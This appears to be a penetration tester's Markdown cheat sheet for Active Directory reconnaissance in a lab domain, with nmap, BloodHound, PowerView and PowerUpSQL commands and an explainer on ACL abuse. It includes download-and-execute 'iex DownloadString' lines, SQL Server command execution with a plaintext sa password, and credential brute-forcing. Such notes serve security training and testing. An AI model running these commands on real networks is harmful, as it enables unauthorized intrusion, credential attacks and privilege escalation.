

Username Enumeration
Network Mapping
Network Enumeration

# Scanning & Enumeration


### **Nmap Scans**

1. Basic network scan:
```bash
nmap 192.168.100.0/24
```

2. Scan without ping (bypasses host discovery):
```
nmap 192.168.100.0/24 -Pn 
```

3. Save scan results in all formats (Normal, XML, and Grepable):
```bash
nmap 192.168.100.0/24 -Pn -oA Basic
```

4. Scan all 65,535 ports:
```bash
nmap 192.168.100.0/24 -Pn -p-1-65535
```

5. OS detection and save results:
```bash
nmap 192.168.100.0/24 -Pn -O  -oA osdetection
```
 6. Check for SMB vulnerabilities:
```bash
nmap --script smb-vuln* -p 139,138,445 192.168.100.0/24 -Pn 
```
7. Enumerate SMB shares and related information:
```bash
nmap --script smb-enum* -p 139,138,445 192.168.100.0/24 -Pn 
```
8. Identify LDAP servers:
```bash
nmap -v --open -p 389,636,3269 192.168.100.0/24 -oA ldap-servers
```
9. Extract IPs of LDAP servers from Nmap output:
```bash
cat ldap-server.nmap | grep "Nmap scan report" | cut -d "(" -f2 | cut -d ")" -f1 > ldap.servers
```

# Additional tools

1. Enumerate SMB shares and users:
```bash
nxc smb 192.168.100.0/24
```
2. Scan the network using NetBIOS:
```bash
nbtscan -r 192.168.100.0/24
```
3. Query SRV records of the AD domain:
```bash
nslookup -type=srv _ldap._tcp.dc._msdcs.soheil.lab 192.168.100.5 
```

```bash
nslookup -type=srv _ldap._tcp.dc._msdcs.child.soheil.lab 192.168.100.7
```

# Powershell

#### **MSSQL Enumeration**

1. Execute OS commands via SQL Server:

```powershell
invoke-sqloscmd -username sa -password bookapp -instance websrv\sqlexpress -command whoami
```

2. Brute-force RID (Relative Identifier) to enumerate domain accounts:

```powershell
Get-SQLFuzzDomainAccount -Instance websrv\sqlexpress -StartId 500 -EndId 2000 -Verbose
Get-SQLFuzzDomainAccount -Instance websrv\sqlexpress -StartId 500 -EndId 2000 -Domain soheil -Verbos
```

3. Enumerate linked SQL servers:

```powershell
Get-SQLServerLinkCrawl -Instance websrv\sqlexpress -Verbose
```
#### **Nishang PowerShell Recon**

1. Port scanning within a specific IP range:

```powershell
invoke-PortScan -StartAddress 192.168.100.1 -EndAddress 192.168.100.13 -ResolveHost -ScanPort 
```
2. Retrieve the current DNS domain name:
```powershell
$env:USERDNSDOMAIN
```
3. Get the DNS root of the domain:
```powershell
(Get-ADDomain).DNSRoot
```
4. Retrieve the domain name using WMI:
```powershell
(Get-WmiObject Win32_ComputerSystem).Domain
```
5. Get domain and forest details:
```powershell
Get-ADDomain | select DNSRoot,NetBIOSName,DomainSID
```

```powershell
Get-ADForest
```

6. Perform brute-force on SQL service:
```powershell
$comp = (get-sqlinstancedomain).computername

$comp | invoke-bruteforce -userlist c:\users\public\user.txt -passwordlist c:\users\public\password.txt -service sql -verbose
```

7. Enumerate forest and domain functional levels:
```powershell
(Get-ADForest).ForestMode
```

```powershell
 (Get-ADDomain).DomainMode
```

8. View domain trust relationships:
```cmd
nltest /domain_trusts
```



**Domain Enumeration**

### Useful References:

- [Microsoft PowerShell Active Directory Module](https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps)
- [SamratAshok ADModule GitHub](https://github.com/samratashok/ADModule)
    - [ADModule Script Import](https://github.com/samratashok/ADModule/blob/master/Import-ActiveDirectory.ps1)
    - [Microsoft.ActiveDirectory.Management.dll](https://github.com/samratashok/ADModule/raw/refs/heads/master/Microsoft.ActiveDirectory.Management.dll)

### PowerShell Language Modes (AV-Friendly Enumeration):

- **Language Modes Overview** ([Reference](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes?view=powershell-7.4)):
    - `FullLanguage`: Full scripting capabilities.
    - `RestrictedLanguage`: No external function or script calls.
    - `ConstrainedLanguage`: Limited scripting for security (introduced in PowerShell 3.0).
    - `NoLanguage`: No scripting allowed.




To check the current session's language mode:
```powershell
$executioncontext.SessionState.LanguageMode
```

### Import AD Module for Enumeration:

1. Download and import the SamratAshok AD module:
```powershell
iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
```
2. Alternatively, manually load the ADModule:
```powershell
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll 
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

### **BloodHound** (Active Directory Enumeration)

- **BloodHound GitHub Repository**: [BloodHoundAD](https://github.com/BloodHoundAD/BloodHound)

#### BloodHound Collectors

1. SharpHound (PowerShell-based collector):


```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/refs/heads/master/Collectors/SharpHound.ps1');
```
2. Run BloodHound Python:
```bash
bloodhound-python  -d soheil.lab -u soheil -p P@ssw0rd1 -dc dc.soheil.lab -c all -ns 192.168.100.5 --zip
```
3. Invoke-BloodHound via PowerShell:
```
Invoke-BloodHound -CollectionMethod All
```

### **SharpView** (C# Alternative)

- **GitHub Repository**: [SharpView](https://github.com/tevora-threat/SharpView)

```
SharpHound.exe
```

```powershell
invoke-command -scriptblock {$env:Computername} -ComputerName dc -Credential soheil\soheil
```

```powershell
invoke-command -scriptblock ${function:Invoke-BloodHound -CollectionMethods all -OutputDirectory C:\inetpub\wwwroot\soheil.zip} -computername dc -credential soheil\setayesh
```


```
Invoke-BloodHound -CollectionMethod All -ExcludeDC
```

### **PowerView** (PowerShell-based AD Enumeration)

- **GitHub Repository**: [PowerSploit Recon/PowerView](https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1)
- Load the module:


```
. .\PowerView.ps1
```

**Active Directory Enumeration Commands**
#### General Commands:

- **Get current domain:**

```powershell
Get-Domain #(PowerView)
```

```
Get-ADDomain #(ActiveDirectory Module)
```

**Get details of another domain:**

```
Get-Domain –Domain soheil.lab
```

```
Get-ADDomain -Identity soheil.lab
```

**Get the domain SID:**

```
Get-DomainSID
```

```
(Get-ADDomain).DomainSID
```


**Retrieve domain policy:**

```
Get-DomainPolicyData
```

```
(Get-DomainPolicyData).systemaccess
```

- Get domain policy for another domain

```
(Get-DomainPolicyData –domain soheil.lab).systemaccess
```


```
get-domain
get-domain -domain soheil.lab
get-domainpolicydata
(get-domainpolicydata).kerberospolicy
get-domaincontoller
```

#### User Enumeration:

- **List all users in the domain:**

```
get-domainuser
```

```
get-domainuser -identity soheil
```

```
get-aduser -filter * -properties *
```

**Get specific user properties:**
```
get-aduser -identity soheil -properties *
```

```
get-domainuser -identity soheil -properties *
```

**Last password set date:**

```
get-aduser -filter * -properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
```

```
get-aduser -filter * -properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}},logoncount
```


**Check for deception (e.g., fake accounts):**
```
get-domainuser -properties samaccountname, logoncount 
```

```
get-aduser -filter * -properties * | select -first 1 | get-member -membertype *property | select name
```

```
get-aduser -filter * -properties * | select name,logoncount,@{expression = { [datetime]::fromFileTime($_.pwdlastset)}}
```

```
get-domainuser -ldapfilter "Description="*built*" | select name,Description
```

```
get-aduser -filter 'Description -like "*built*"' -properties Description | select name,Description
```

#### Computer Enumeration:

- **List all domain computers:**

```
get-domaincomputer | select name
get-domaincomputer -operatingsystem "*server 2016*"
get-domaincomputer -ping
```

```
get-adcomputer -filter * | select name

```

```
get-adcomputer -filter * -properties * 
```
**Filter computers by OS:**
```
get-adcomputer -filter 'OperatingSystem' -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem
```

**Ping all computers in the domain:**
```
get-adcomputer -filter * -properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName }
```

#### Group Enumeration:

- **List all domain groups:**
```
get-domaingroup | select name
```

```
get-domaingroup -domain 
```

```
get-adgroup -filter *  | select name
```

```
get-adgroup -filter * -properties * 
```

**Filter groups by name:**

```
get-domaingroup *admin*
```

```
get-adgroup -filter 'Name -like "*admin*"' | select Name
```

**List members of a specific group:**

```
get-domaingroupmember -identity "Domain Admins" -Recurse
```

```
get-adgroupmember -identity "Domain Admins" -recursive
```


```
get-domaingroup -username "soheil"

get-adprincipalgroupmembership -identity soheil
```


#### Local Enumeration:

- **List local groups on a machine:**

```
get-netlocalgroup -computername dc.soheil.lab -listgroups
```

**Get members of a local group:**

```
get-netlocalgroupmember -computername dc.soheil.lab -groupname administrators
```


**List logged-on users:**

- **Actively logged users:**

```
get-netloggedon -computername dc.soheil.lab
```

**Locally logged users:**

```
get-loggedonlocal -computername dc.soheil.lab
```

**Last logged-on user:**

```
get-lastloggedon -computername dc.soheil.lab
```

#### File & Share Enumeration:

- **Find shares on domain hosts:**

```
invoke-sharefinder -verbose
```

**Find sensitive files:**

```
invoke-filefinder -verbose
```

**Get all file servers in the domain:**

```
get-netfileserver
```


**Get all members of the Domain Admins group:**

```
get-domaingroupmember -identity "Domain Admins" -Recurse
```

```
get-adgroupmember -identity "Domain Admins" -Recursive
```


**Get group membership for a specific user:**

```
get-domaingroup -Username "soheil"
get-adprincipalgroupmembership -identity soheil
```

- Enumerate following for the soheil domain:

```
. .\powerview.ps1
```
Retrieve all domain users:
```
get-domainuser | select -expandproperty samaccountname
```
**List all computers in the domain:**

```
get-domaincomputer | select -Expandproperty dnshostname
```

**Domain Administrators:**

```
get-domaingroupmember -identity "Domain Admins"
```

**Enterprise Administrators:**

```
get-domaingroupmember -identity "Enterprise Admins" -domain soheil.lab
```

**List all GPOs in the current domain:**

```
get-domaingpo
```
**List GPOs applied to a specific computer:**
```
get-domaingpo -computeridentity dc
```


### **Restricted Groups or Groups.xml**

- **Identify GPOs that use Restricted Groups or groups.xml for specific users:**
```
get-domaingpolocalgroup
```

```
get-domaingpo | select Displayname
```


### **Group Membership via GPO**

- **Retrieve users in a local group on a machine via GPO:**

```
get-domaingpocomputerlocalgroupmapping -computeridentity dc
```


**Find machines where a given user is a member of a specific group:**

```
get-domaingpouserlocalgroupmapping -identity soheil -verbose
```

## **Organizational Unit (OU) Enumeration**

### **List All OUs**

- **Retrieve all OUs in the domain:**
```
get-domainou

get-adorganizationalunit -filter * -properties *
```


- Get GPO(s) which use Restricted Groups or groups.xml for interesting users.

```
get-domaingpolocalgroup
```

### **Group Membership via GPO**

- **Retrieve users in a local group on a machine via GPO:**

```
get-domaingpocomputerlocalgroupmapping -computeridentity dc
```

**Find machines where a given user is a member of a specific group:**


```
get-domaingpouserlocalgroupmapping -identity soheil -verbose
```


- Enumerate following for the soheil domain:
-List all the OUs

```
Get-domainou | select -ExpandProperty name
```

### **Enumerate Computers in Specific OU**

- **List all computers in the "manager" OU:**

```
(get-domainou -identity manager).distinguishedname | %{get-domaincomputer -searchbase $_} | select name
```



**Get GPOs linked to the "manager" OU:**

```
(get-domainou -identity manager).gplink

get-domaingpo -identity '{}'
```

```
get-domaingpo -identity (get-domainou -identity manager).gplink.substring(11,(get-domainou -identity manager).gplink.lenght-72)
```


### **ACL (Access Control List) Overview**

An **Access Control List (ACL)** is a data structure used to control the ability of a process or user to access objects and resources within systems like Active Directory (AD). It ensures secure and appropriate access based on defined permissions.

Key elements:

- **Access Tokens**: Represent the security context of a user or process. They include the user’s **Security Identifier (SID)** and their privileges.
- **Security Descriptors**: Contain details about ownership and access control, including:
    - **Owner SID**: Identifies the owner of the object.
    - **Discretionary ACL (DACL)**: Controls access permissions for users and groups.
    - **System ACL (SACL)**: Logs access attempts for auditing purposes.

### **Types of ACLs**

#### **1. Discretionary Access Control List (DACL)**

- Defines **who** can perform **what actions** on an object.
- Composed of **Access Control Entries (ACEs)**, which specify:
    - The **trustee** (user or group).
    - The **permissions** (read, write, modify, etc.).

**Example of a DACL**:

- A DACL on a folder might state:
    - User `Alice` can read and write.
    - Group `Managers` can only read.
    - User `Bob` is explicitly denied access.

#### **2. System Access Control List (SACL)**

- Used for **auditing** purposes. It logs successful and failed access attempts to objects.
- Helps administrators track suspicious or unauthorized activities.

**Example of a SACL**:

- A SACL could be configured to:
    - Log every attempt (success or failure) to read a sensitive document.
    - Track changes made to an object, like adding a user to a group.

### **Access Control Entries (ACEs)**

An **Access Control Entry (ACE)** is a single entry in an ACL that defines specific permissions for a trustee. Each ACE specifies:

- **SID** of the trustee (user or group).
- **Access mask** (permissions, such as read, write, delete).
- Flags for inheritance and propagation of permissions.

**Types of ACEs**:

1. **Allow ACE**: Grants specific permissions.
2. **Deny ACE**: Explicitly denies permissions, overriding allow rules.
3. **Audit ACE**: Used in SACLs for tracking access.

**Example of ACEs**:

- Allow ACE: Grant `Read` and `Write` permissions to `User1`.
- Deny ACE: Deny `Delete` permission to `Everyone`.

### **How Hackers Exploit ACLs**

Misconfigured or weak ACLs in Active Directory can be exploited by attackers to escalate privileges, gain unauthorized access, or persist within a network.

#### **Common Types of Abuse**

1. **Privilege Escalation**
    
    - Attackers modify a DACL to grant themselves higher privileges.
    - Example: Adding `Full Control` for their user account to a sensitive AD object like a group or user account.
2. **Persistence**
    
    - Attackers create backdoors by adding themselves or their accounts to privileged groups (e.g., `Domain Admins`).
    - Example: Adding their account to the `Administrators` group via a misconfigured ACL.
3. **Data Tampering**
    
    - Gaining unauthorized permissions to modify objects, such as changing attributes of a user account (e.g., resetting passwords).
    - Example: Changing the `password` attribute of a target account in AD.
4. **Stealthy Monitoring**
    
    - Using SACL misconfigurations to avoid detection by tampering with audit logging or monitoring access attempts.
5. **Abuse of Object Ownership**
    
    - Attackers can claim ownership of objects and then modify the DACL to grant themselves permissions.
    - Example: Taking ownership of a user account object and modifying the DACL to allow unrestricted access.

#### **1. GenericAll**

- **Definition**: Grants full control over the object, equivalent to "Full Control" in most contexts.
- **Abuse**:
    - An attacker with `GenericAll` permissions can perform any action on the object, such as modifying attributes, adding themselves to groups, resetting passwords, or even deleting the object.
- **Example**:
    - Attacker gains `GenericAll` on the `Domain Admins` group. They add their account to the group, gaining domain-wide control.

---

#### **2. GenericWrite**

- **Definition**: Allows modification of an object’s non-protected attributes.
- **Abuse**:
    - Attackers can modify attributes like `servicePrincipalName` (SPN), `userPassword`, or `memberOf`.
    - Particularly dangerous for user accounts, as it can enable password resets or SPN hijacking (used in Kerberos-based attacks).
- **Example**:
    - Attacker with `GenericWrite` on a user account modifies the `userPassword` attribute to set a known password, gaining access to the account.

---

#### **3. WriteOwner**

- **Definition**: Allows changing the owner of the object.
- **Abuse**:
    - An attacker can make themselves the owner of the object and then modify its DACL to grant themselves full control (e.g., `GenericAll`).
- **Example**:
    - Attacker changes ownership of a critical group object, then modifies the DACL to add themselves with `Full Control`.

---

#### **4. WriteDACL**

- **Definition**: Allows modifying the object’s DACL (permissions).
- **Abuse**:
    - An attacker can modify the DACL to grant themselves or others permissions like `GenericAll` or `GenericWrite`.
- **Example**:
    - Attacker with `WriteDACL` on a sensitive user object adds an ACE granting their account `GenericAll`.

---

#### **5. ReadProperty**

- **Definition**: Allows reading specific properties of an object.
- **Abuse**:
    - Attackers can gather sensitive information, such as SPNs for Kerberoasting or email addresses for phishing campaigns.
- **Example**:
    - Attacker uses `ReadProperty` to extract SPNs for accounts, enabling a Kerberoasting attack.

---

#### **6. ExtendedRights**

- **Definition**: A category of special permissions that allow performing advanced actions on objects.
- **Common Extended Rights**:
    - **ResetPassword**: Allows resetting the password of a user account.
    - **Replicating Directory Changes**: Used in attacks like DCSync to replicate AD data, including password hashes.
    - **ChangePassword**: Allows changing the password of an account.
- **Abuse**:
    - `ResetPassword` or `ChangePassword` rights can be used to take over accounts without knowing their current password.
    - `Replicating Directory Changes` enables attackers to simulate domain controllers and dump AD data, including credentials.
- **Example**:
    - An attacker with `ResetPassword` on a user account resets the password to a known value and uses the account to escalate privileges.

---

#### **7. Delete**

- **Definition**: Allows deletion of the object.
- **Abuse**:
    - Attackers can delete objects to disrupt services or cover their tracks.
- **Example**:
    - Attacker deletes an account used for monitoring or auditing activities.

---

### **How Hackers Abuse These Permissions**

1. **Privilege Escalation**
    
    - **Scenario**: An attacker gains `GenericWrite` on a privileged group like `Domain Admins`.
    - **Action**: They add their account to the group, granting them domain-level control.
2. **Lateral Movement**
    
    - **Scenario**: An attacker gains `WriteOwner` on a service account.
    - **Action**: They take ownership of the account and use its permissions to access other systems.
3. **Persistence**
    
    - **Scenario**: An attacker gains `WriteDACL` on a sensitive object.
    - **Action**: They modify the DACL to ensure they have permissions, even if other access paths are revoked.
4. **Data Exfiltration**
    
    - **Scenario**: An attacker uses `ReadProperty` on accounts to extract SPNs.
    - **Action**: They perform Kerberoasting to crack passwords offline.
5. **Account Takeover**
    
    - **Scenario**: An attacker gains `ResetPassword` or `ChangePassword` rights on a privileged account.
    - **Action**: They reset the password to access the account directly.

---

### **Real-World Examples**

1. **Changing Permissions**
    
    - An attacker exploits a weak DACL on a sensitive object to grant themselves `Full Control`. They can then perform actions like:
        - Resetting passwords for critical accounts.
        - Deleting or modifying sensitive data.
2. **Adding to Groups**
    
    - An attacker abuses ACLs on a group object to add their account to privileged groups like `Domain Admins` or `Enterprise Admins`.
3. **Modifying Attributes**
    
    - Exploiting weak permissions to change key attributes of user accounts, such as:
        - Resetting the password of an administrative account.
        - Changing the `userAccountControl` attribute to re-enable a disabled account.
4. **Disabling Logging**
    
    - Tampering with SACLs to disable logging on sensitive objects, hindering forensic investigations.

### **Mitigation and Best Practices**

1. **Regular Auditing**
    
    - Review ACL configurations, especially for privileged accounts and groups.
    - Check for anomalous SIDs or unexpected permissions.
2. **Principle of Least Privilege (PoLP)**
    
    - Assign the minimum necessary permissions to users and groups.
3. **Enable and Monitor SACLs**
    
    - Configure SACLs to log key access attempts, such as modifications to high-value AD objects.
4. **Restrict Ownership**
    
    - Ensure critical objects are owned by trusted and verified accounts only.
5. **Use Security Tools**
    
    - Leverage tools like Microsoft’s Advanced Threat Analytics (ATA) or third-party tools to detect ACL abuse and suspicious activities.

# **Active Directory ACL Enumeration**

### **Retrieve ACLs**

- **Get ACLs for a specific object:**

```
get-domainobjectacl -samaccountname soheil -resolveguids
```

**Get ACLs for objects using a search base:**

```
get-domainobjectacl -searchbase "LDAP://CN=Domain Admins,CN=Users,DC=soheil,DC=lab" -resolveguids -verbose
```

**Using ActiveDirectory module (without resolving GUIDs):**

```
(get-acl 'AD:\CN=Administrator,CN=users,dc=soheil,dc=lab').access
```

**Search for interesting ACEs:**
```
Find-InterestingDomainAcl -ResolveGUIDs
```

**Get ACLs for a specific path:**

```
get-pathacl -path "\\dc.soheil.lab\sysvol"
```

### **Enumerate ACLs for Specific Objects**

- **Domain Admins Group:**
```
get-domainobjectacl -identity "Domain Admins" -resolveguids -verbose
```

**All modify rights/permissions for a user/group:**

```
find-interestingdomainacl -resolveguids | ?{$_.identityrefrencename -match "soheil"}
```

# **Trust Enumeration**

### **Understanding Trusts**

1. **Trust Types:**
    
    - **Parent-Child Trust:** Two-way, transitive (automatic within the same forest).
    - **Tree-Root Trust:** Two-way, transitive (automatic for forest root domains).
    - **External Trust:** One-way or two-way, non-transitive (between domains in different forests).
    - **Forest Trust:** One-way or two-way, transitive, but not extendable to third forests.
2. **Trust Direction:**
    
    - **One-Way Trust:** Access allowed in one direction.
    - **Two-Way Trust:** Access allowed in both directions.

---

### **Domain Trust Mapping**

- **Get domain trusts for the current domain:**
```
get-domaintrust

get-domaintrust -domain soheil.lab
```
**Using ActiveDirectory module:**
```
get-adtrust
get-adtrust -identity soheil.lab
```

### **Forest Mapping**

- **Details about the current forest:**

```
get-forest

get-forest -forest soheil.lab

get-adforest 

get-adforest -identity soheil.lab
```

**All domains in the forest:**

```
get-forestdomain

get-forestdomain -forest soheil.lab 

(get-adforest).domains
```


**All global catalogs in the forest:**

```
get-forestglobalcatalog

get-forestglobalcatalog -forest soheil.lab

get-adforest | select -expandproperty globalcatalogs
```


**Map trusts of a forest:**

```
get-foresttrust

get-foresttrust -forest soheil.lab

get-adtrust -filter 'msDS-TrustForestTrustInfo' -ne "$null"
```


**Enumerate all domains in the `soheil.lab` forest:**

```
get-forestdomain -verbose
```

**Map the trusts of `child.soheil.lab`:**

```
get-forestdomain | %{get-domaintrust -domain $_.Name} | ?{$_.TrustAttributes -eq "Filter_SIDS"}
```


- map external trusts in diablo.lab forest.

- identify external trusts of diablo domain. Can you enumerate trusts for trusting forest


# **Session and Access Enumeration**

### **Local Admin Access**

- **Find machines where the current user has local admin access:**

```
find-localadminaccess -verbose
```

**Alternative methods (when RPC/SMB are blocked):**

- Use `Find-WMILocalAdminAccess.ps1` or `Find-PSRemotingLocalAdminAccess.ps1`.
- 

- This can also be done with the help of remote administration tools like WMI and Powershell Remoting. Pretty useful in cases ports (RPC and SMB) used by Find-LocalAdminAccess are blocked.

- see find-wmilocaladminaccess.ps1 and find-psremotinglocaladminaccess.ps1

**Find computers where a specific user/group has sessions:**


```
Find-domainuserlocation -verbose
```



```
Find-domainuserlocation -usergroupidentity "RDPusers"
```

- This function queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using get-domaingroupmember, gets a list of computers (get-domaincomputer) and list sessions and logged on users (get-netsession/getnetloggedon) from each machine.

**Check access for domain admin sessions:**

```
find-domainuserlocation -checkaccess
```

Got detected by ATA

https://github.com/darkoperator/Veil-PowerView/blob/master/PowerView/functions/Invoke-UserHunter.ps1

### **Advanced User Hunting**

- **Using PowerView for user hunting:**

```powershell
. .\powerview.ps1

get-netcomputer

get-netgroupmember -groupname "domain admins"

invoke-userhunter -computerfile .\computers.txt -verbose



```

**Detect file servers or distributed file servers with domain admin sessions:**
**Detect computers where domain admin sessions exist:**

```
find-domainuserlocation -stealth
```


### **Scenario 1: Enumerate for the `soheil.lab` Domain**

- **Users:**
```powershell
. .\PowerView.ps1
Get-NetUser
Get-NetUser -Domain soheil.lab | Select -ExpandProperty SamAccountName
```
**Computers:**
```powershell
Get-NetComputer
```

**Domain Administrators:**
```powershell
Get-NetGroup -Identity "Domain Admins" -Domain soheil.lab
Get-NetGroupMember -Identity "Domain Admins"
```

**Enterprise Administrators:**

```powershell
Get-NetGroupMember -Identity "Enterprise Admins" -Domain soheil.lab
```

**Shares:**
```powershell
Invoke-ShareFinder -Verbose
```




### **Scenario 2: Enumerate for the `soheil` Domain**

- **List All Organizational Units (OUs):**
```powershell
Get-NetOU
```

**List All Computers in the `Machines` OU:**
```powershell
Get-NetOU Machines | ForEach-Object { Get-NetComputer -ADSPath $_ }
```

**List All Group Policy Objects (GPOs):**

```powershell
(Get-NetOU -Identity Machines).gplink
Get-NetGPO -ADSpath '[LDAP://cn={92B77BBB-F169-45D6-B861-633B7B536CEB},cn=policies,cn=system,DC=lucifer,DC=lab;0]'
```

**Enumerate GPO Applied on the `Machines` OU:**
```powershell
(Get-NetOU -Identity Machines).gplink
Get-NetGPO -ADSpath '[LDAP://cn={92B77BBB-F169-45D6-B861-633B7B536CEB},cn=policies,cn=system,DC=lucifer,DC=lab;0]'
```

**Scenario 3: Enumerate for the `soheil` Domain**
**ACL for the `Users` Group:**
```powershell
Get-ObjectAcl -SamAccountName "Users" -ResolveGUIDs -Verbose
```
**ACL for the `Domain Admins` Group:**
```powershell
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs -Verbose
```
**All Modify Rights/Permissions for the `soheil` User:**
```powershell
Get-NetGPO | ForEach-Object { Get-ObjectAcl -ResolveGUIDs -Name $_.Name }
Get-NetGPO | ForEach-Object { Get-ObjectAcl -ResolveGUIDs -Name $_.Name } | Where-Object { $_.IdentityReference -match "soheil" }
```

**Scan ACLs for Specific References:**
```powershell
Invoke-ACLScanner -ResolveGUIDs | Where-Object { $_.IdentityReference -match "soheil" }
Invoke-ACLScanner -ResolveGUIDs | Where-Object { $_.IdentityReference -match "admins" }
```

**Scenario 4: Trust and Forest Enumeration**
**Enumerate All Domains in the `lucifer.lab` Forest:**

```powershell
Get-NetForestDomain -Verbose
```

**Map Trusts of the `child.soheil.lab` Domain:**

```powershell
Get-NetDomainTrust
```

**Map External Trusts in the `diablo.lab` Forest:**
```powershell
Get-NetForestDomain -Verbose | Get-NetDomainTrust | Where-Object { $_.TrustType -eq 'External' }
```

**Identify External Trusts of the `soheil` Domain:**
```powershell
Get-NetDomainTrust | Where-Object { $_.TrustType -eq 'External' }
```

**Enumerate Trusts for a Trusting Forest:**
```powershell
Get-NetForestDomain -Forest soheil.lab -Verbose | Get-NetDomainTrust
```


